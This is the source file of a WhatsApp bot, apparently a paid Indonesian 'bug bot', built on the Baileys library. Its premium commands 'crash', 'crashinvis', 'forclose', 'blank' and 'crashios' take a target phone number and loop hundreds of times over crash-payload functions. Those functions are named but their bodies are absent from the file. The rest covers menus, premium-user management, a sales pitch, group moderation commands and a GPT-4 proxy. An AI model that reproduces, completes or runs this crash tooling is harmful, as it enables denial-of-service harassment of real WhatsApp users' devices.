//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const axios = require('axios')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = syah = async (syah, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await syah.decodeJid(syah.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!syah.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await syah.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${m.sender}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
//FUNCTION BUG


//======================
switch (command) {
//case bug
case "crash": {
if (!isPremium) return m.reply('ᴏʀᴀɴɢ ɢɪʟᴀ ᴍᴀᴋᴇ ғɪᴛᴜʀ ɪɴɪ ᴡᴋᴡᴋᴡᴋ');
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*sᴜᴄᴄsᴇs ᴋᴀᴋ sᴇɴᴅ ʙᴜɢ ᴋᴇ ᴛᴀʀɢᴇᴛ ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛ ʏᴀ ʙɪᴀʀ ʙᴏᴛ ɢᴀ kenon🥶*`); 

          for (let i = 0; i < 870; i++) {
            await multiHardScorpio(target, true);
            await location(target, true);
            await invisblekontak(target, true);
            await delay(target, true);
        }

    }

  

break;
//======================
case "crashinvis": {
if (!isPremium) return m.reply('ʟᴜ ɢɪʟᴀ ʏᴀ ʙᴀɴɢ ᴍᴀᴋᴇ ғɪᴛᴜʀ ɢᴡ?');
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*sᴜᴄᴄsᴇs ᴋᴀᴋ sᴇɴᴅ ʙᴜɢ ᴋᴇ ᴛᴀʀɢᴇᴛ ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛ ʏᴀ ʙɪᴀʀ ʙᴏᴛ ɢᴀ ᴋᴇɴᴏɴ🥶*`); 
          for (let i = 0; i < 879; i++) {
            await BlankScreen(target, true);
            await BlankNotific(target, true);
            await EfceBeta(target, true);
            await JustinXFlowButton(target, true);
            await CrashComboButtons(target, true);
        }
    }
  
break;
//======================
case "forclose": {
if (!isPremium) return m.reply('ʏᴀʜʜᴀʜᴀ ᴏʀᴀɴɢ ɢɪʟᴀ ɢᴀ ᴅɪ ᴀᴊᴀᴋ');  
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*sᴜᴄᴄsᴇs ᴋᴀᴋ sᴇɴᴅ ʙᴜɢ ᴋᴇ ᴛᴀʀɢᴇᴛ ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛ ʏᴀ ʙɪᴀʀ ʙᴏᴛ ɢᴀ kenon🥶*`); 
          for (let i = 0; i < 879; i++) {
            await TvxFcNew(target, true);
            await VanitasFC(target, true);
            await VampDelayNew(target, true);
            await CrlButton(target, true);
            await SyahCoreFc(target, true);
        }

    }
  
break;

case "blank": {
if (!isPremium) return m.reply('ɪɴɪ ʟᴀɢɪ 1 ᴏʀᴀɴɢ ɢɪʟᴀ ʙᴇɢᴏ ᴍᴀᴋᴇ ғɪᴛᴜʀ ᴋᴇʀᴇɴ ɢᴡ');  
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*sᴜᴄᴄsᴇs ᴋᴀᴋ sᴇɴᴅ ʙᴜɢ ᴋᴇ ᴛᴀʀɢᴇᴛ ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛ ʏᴀ ʙɪᴀʀ ʙᴏᴛ ɢᴀ kenon🥶*`); 
          for (let i = 0; i < 879; i++) {
            await blank(target, Ptcp = true);
            await uiLag(target, true);
            await UiLocationByXrelly(target, Ptcp = true);
        }

    }
  
break;

case "crashios": {
if (!isPremium) return m.reply('ɪɴɪ ʟᴀɢɪ 1 ᴏʀᴀɴɢ ɢɪʟᴀ ʙᴇɢᴏ ᴍᴀᴋᴇ ғɪᴛᴜʀ ᴋᴇʀᴇɴ ɢᴡ');  
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*sᴜᴄᴄsᴇs ᴄʀᴀsʜ ɪᴏs ᴋᴇᴘᴀᴅᴀ ᴛᴀʀɢᴇᴛ ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛ ʏᴀ ʙɪᴀʀ ʙᴏᴛ ɢᴀ kenon🥶*`); 
          for (let i = 0; i < 879; i++) {
            await VampiPhone(target, true);
            await VampCrashIos(target, true);
            await VampiPhone(target, true);
        }

    }
  
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (syah.public === true) return m.reply("ʙɪsɪᴋ ᴀɴᴊɪɴɢ ᴅᴏɴᴇ ɴɪʜ ᴘᴜʙʟɪᴄ ᴛᴏʟᴏʟ");
syah.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (syah.public === false) return m.reply("ᴇʜ ᴛᴏʟᴏʟ ɢᴡ ᴅᴀʀɪ ᴛᴀᴅɪ ᴅɪᴇᴍ ʙᴇʀᴀʀᴛɪ sᴇʟғ ʙᴇɢᴏ");
syah.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": {
await syah.sendMessage(m.chat, { react: { text: "😹",key: m.key,}}); 
let itsmenu = 
`\`𝘏𝘐 𝘐 𝘈𝘔 𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗 𝘉𝘖𝘛 𝘋𝘐𝘎𝘐𝘛𝘈𝘓 𝘠𝘈𝘕𝘎 𝘚𝘐𝘈𝘗 𝘔𝘌𝘔𝘉𝘈𝘕𝘛𝘜 𝘈𝘕𝘋𝘈 𝘜𝘕𝘛𝘜𝘒 𝘔𝘌𝘔𝘉𝘌𝘙𝘌𝘚𝘒𝘈𝘕 𝘔𝘈𝘚𝘈𝘓𝘈𝘏\`
  
*\`- INFORMATION BOT\`*
 *⌬ Botname* : *𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗*
 *⌬ Owner* : https://ẉ.ceo/SyahNotDev
 *⌬ Version* : *1.2*
 *⌬ Status* : *Vip Buy Only!!*
 
𝘚𝘐𝘓𝘈𝘏𝘒𝘈𝘕 𝘗𝘐𝘓𝘐𝘏 𝘔𝘌𝘕𝘜 𝘋𝘐𝘉𝘈𝘞𝘈𝘏 𝘠𝘈 𝘉𝘈𝘕𝘎/𝘒𝘈𝘒😋
`
let buttons = [
            { buttonId: ".bugmenu", buttonText: { displayText: "𝘔𝘌𝘕𝘜 𝘉𝘜𝘎" } },
            { buttonId: ".ownermenu", buttonText: { displayText: "M𝘌𝘕𝘜 𝘖𝘞𝘕𝘌𝘙" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/y1v5qe.jpg",
            gifPlayback: true 
        },
        caption: itsmenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400565794836@newsletter", 
                newsletterName: "SYAHV2D"
            }
        },
        footer: "© SYAH",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: '.bugmenu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "© 𝘚𝘠𝘈𝘏",
                            highlight_label: "𝘗𝘖𝘞𝘌𝘙𝘋 𝘉𝘠 𝘚𝘠𝘈𝘏",
                            rows: [
                                { title:  "𝘚𝘊𝘙𝘐𝘗𝘛", description: "𝘉𝘜𝘠 𝘚𝘊", id: `.sc` },                             
                                  { title: "𝘛𝘏𝘈𝘕𝘒𝘚 𝘛𝘖𝘖", description: "𝘔𝘈𝘒𝘈𝘚𝘐𝘏", id: `.tqto` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await syah.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "bugmenu": {
await syah.sendMessage(m.chat, { react: { text: "👾",key: m.key,}}); 
let bugmenu =
`\`𝘏𝘐 𝘐 𝘈𝘔 𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗 𝘉𝘖𝘛 𝘋𝘐𝘎𝘐𝘛𝘈𝘓 𝘠𝘈𝘕𝘎 𝘚𝘐𝘈𝘗 𝘔𝘌𝘔𝘉𝘈𝘕𝘛𝘜 𝘈𝘕𝘋𝘈 𝘜𝘕𝘛𝘜𝘒 𝘔𝘌𝘔𝘉𝘌𝘙𝘌𝘚𝘒𝘈𝘕 𝘔𝘈𝘚𝘈𝘓𝘈𝘏\`
  
*\`- INFORMATION BOT\`*
 *⌬ Botname* : *𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗*
 *⌬ Owner* : https://ẉ.ceo/SyahNotDev
 *⌬ Version* : *1.2*
 *⌬ Status* : *Vip Buy Only!!*

*- BUG MENU*
 ⌬ ᴄʀᴀsʜ 628xxxx
 ⌬ ᴄʀᴀsʜɪɴᴠɪs 628xxxx
 ⌬ ғᴏʀᴄʟᴏsᴇ 628xxxx
 ⌬ ᴄʀᴀsʜɪᴏs 628xxxx
 ⌬ ʙʟᴀɴᴋ 628xxxx
`
let buttons = [
            { buttonId: ".menu", buttonText: { displayText: "𝘒𝘌𝘔𝘉𝘈𝘓𝘐" } },
            { buttonId: ".ownermenu", buttonText: { displayText: "M𝘌𝘕𝘜 𝘖𝘞𝘕𝘌𝘙" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/y1v5qe.jpg",
            gifPlayback: true 
        },
        caption: bugmenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400565794836@newsletter", 
                newsletterName: "SYAHV2D"
            }
        },
        footer: "© SYAH",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: '.bugmenu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "© 𝘚𝘠𝘈𝘏",
                            highlight_label: "𝘗𝘖𝘞𝘌𝘙𝘋 𝘉𝘠 𝘚𝘠𝘈𝘏",
                            rows: [
                                { title:  "𝘚𝘊𝘙𝘐𝘗𝘛", description: "𝘉𝘜𝘠 𝘚𝘊", id: `.sc` },                             
                                  { title: "𝘛𝘏𝘈𝘕𝘒𝘚 𝘛𝘖𝘖", description: "𝘔𝘈𝘒𝘈𝘚𝘐𝘏", id: `.tqto` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await syah.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "ownermenu": {
await syah.sendMessage(m.chat, { react: { text: "😸",key: m.key,}}); 
let ownermenu = 
`\`𝘏𝘐 𝘐 𝘈𝘔 𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗 𝘉𝘖𝘛 𝘋𝘐𝘎𝘐𝘛𝘈𝘓 𝘠𝘈𝘕𝘎 𝘚𝘐𝘈𝘗 𝘔𝘌𝘔𝘉𝘈𝘕𝘛𝘜 𝘈𝘕𝘋𝘈 𝘜𝘕𝘛𝘜𝘒 𝘔𝘌𝘔𝘉𝘌𝘙𝘌𝘚𝘒𝘈𝘕 𝘔𝘈𝘚𝘈𝘓𝘈𝘏\`
  
*\`- INFORMATION BOT\`*
 *⌬ Botname* : *𝘋𝘌𝘓𝘜𝘟𝘌 𝘚𝘝𝘐𝘗*
 *⌬ Owner* : https://ẉ.ceo/SyahNotDev
 *⌬ Version* : *1.2*
 *⌬ Status* : *Vip Buy Only!!*

*\`- OWNER ᴍᴇɴᴜ\`*
 ⌬ ᴀᴅᴅᴍᴜʀʙᴜɢ 628xxxx
 ⌬ ᴅᴇʟᴍᴜʀʙᴜɢ 628xxxx
 ⌬ ɢᴘᴛ4
 ⌬ ᴄᴇᴋɪᴅᴄʜ
 ⌬ ᴋɪᴄᴋ
 ⌬ ᴏᴘᴇɴ
 ⌬ ᴄʟᴏsᴇ
 ⌬ ʜɪᴅᴇᴛᴀɢ
`
let buttons = [
            { buttonId: ".menu", buttonText: { displayText: "𝘒𝘌𝘔𝘉𝘈𝘓𝘐" } },
            { buttonId: ".bugmenu", buttonText: { displayText: "MENU 𝘉𝘜𝘎" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/y1v5qe.jpg",
            gifPlayback: true 
        },
        caption: ownermenu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400565794836@newsletter", 
                newsletterName: "SYAHV2D"
            }
        },
        footer: "© SYAHV2D",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "© 𝘚𝘠𝘈𝘏",
                            highlight_label: "𝘗𝘖𝘞𝘌𝘙𝘋 𝘉𝘠 𝘚𝘠𝘈𝘏",
                            rows: [
                                { title:  "𝘚𝘊𝘙𝘐𝘗𝘛", description: "𝘉𝘜𝘠 𝘚𝘊", id: `.sc` },                             
                                  { title: "𝘛𝘏𝘈𝘕𝘒𝘚", description: "𝘔𝘈𝘒𝘈𝘚𝘐𝘏", id: `.tqto` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await syah.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
//======================
case 'tqto': {
await syah.sendMessage(m.chat, { react: { text: "🌹",key: m.key,}}); 
let makasih = `
     *THANKS TOO*
┏────────────────
┃ - 𝘈𝘓𝘓𝘈𝘏 𝘚𝘞𝘛 [ 𝘔𝘠 𝘎𝘖𝘖𝘋 ]
┃ - 𝘚𝘠𝘈𝘏 [ 𝘋𝘌𝘝𝘌𝘓𝘖𝘗𝘌𝘙 ]
┃ - 𝘍𝘋𝘓 [ 𝘗𝘈𝘙𝘛𝘕𝘌𝘙 ]
┃ - 𝘈𝘙𝘚 [ 𝘗𝘈𝘙𝘛𝘕𝘌𝘙 ]
┃ - 𝘈𝘚𝘛𝘙𝘈𝘝 [ 𝘗𝘈𝘙𝘛𝘕𝘌𝘙 ]
┃ - 𝘙𝘌𝘓𝘡 [ 𝘗𝘈𝘙𝘛𝘕𝘌𝘙 ]
┃ - 𝘔𝘠 𝘒𝘌𝘓𝘜𝘈𝘙𝘎𝘈 [ 𝘚𝘜𝘗𝘗𝘖𝘙𝘛 ]
┃ - ALL PENGUNA SCRIPT
┗─────────────────
`
let buttons = [
            { buttonId: ".menu", buttonText: { displayText: "𝘒𝘌𝘔𝘉𝘈𝘓𝘐" } },
            { buttonId: ".bugmenu", buttonText: { displayText: "MENU 𝘉𝘜𝘎" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/y1v5qe.jpg",
            gifPlayback: true 
        },
        caption: makasih,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400565794836@newsletter", 
                newsletterName: "SYAHV2D"
            }
        },
        footer: "© SYAHV2D",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "© 𝘚𝘠𝘈𝘏",
                            highlight_label: "𝘗𝘖𝘞𝘌𝘙𝘋 𝘉𝘠 𝘚𝘠𝘈𝘏",
                            rows: [
                                { title:  "𝘚𝘊𝘙𝘐𝘗𝘛", description: "𝘉𝘜𝘠 𝘚𝘊", id: `.sc` },                             
                                  { title: "OWNER", description: "M𝘌𝘕𝘜 𝘖𝘞𝘕𝘌𝘙", id: `.ownermenu` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await syah.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
//======================
case "addmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /addmurbug (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`𝚗𝚘𝚖𝚘𝚛 ${user} 𝚝𝚎𝚕𝚊𝚑 𝚖𝚎𝚗𝚓𝚊𝚍𝚒 𝚖𝚞𝚛𝚋𝚞𝚐`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /delmurbug (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `𝚗𝚘𝚖𝚘𝚛 ${user} 𝚍𝚒 𝚑𝚊𝚙𝚞𝚜 𝚍𝚊𝚛𝚒 𝚖𝚞𝚛𝚋𝚞𝚐 𝚍𝚊𝚗 𝚝𝚊𝚔 𝚋𝚒𝚜𝚊 𝚖𝚎𝚗𝚐𝚊𝚔𝚜𝚎𝚜 𝚋𝚘𝚝 𝚒𝚗𝚒` : "𝚞𝚜𝚎𝚛 𝚝𝚎𝚕𝚊𝚑 𝚍𝚒 𝚑𝚒𝚕𝚊𝚗𝚐𝚔𝚊𝚗")}
break;
//======================
case 'gpt4': {
  if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break
//======================
case "kik": case "kick": {
if (!isGroup) return m.reply(m.group)
if (!isCreator) return m.reply(m.owner)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await syah.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => syah.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
//======================
case "hidetag": case "z": case "h": {
if (!isGroup) return m.reply(m.group)
if (!isCreator) return m.reply(m.owner)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
syah.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
//======================
case "open": {
if (!isGroup) return m.reply(m.group)
if (!isCreator) return m.reply(m.owner)
await syah.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
//======================
case "close": {
if (!isGroup) return m.reply(m.group)
if (!isCreator) return m.reply(m.owner)
await syah.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
//======================
case "cekidch": case "idch": {
await syah.sendMessage(m.chat, { react: { text: "⌛",key: m.key,}}); 
if (!text) return m.reply(("linkchnya mana goblok bet lu?"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await syah.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Verif"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await syah.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break;
//==================
case 'script': case 'sc': {
await syah.sendMessage(m.chat, { react: { text: "💸",key: m.key,}}); 
let buy = `
*\`▧ 「 SCRIPT DELUXE SVIP」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- *DELUXE SVIP?*
┃
┃友 *Chat 1 : wa.me/628388907868*
┃友 *Telegram : https://t.me/syahv2doffc*
╰────────────────━`
syah.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 25000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break
//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}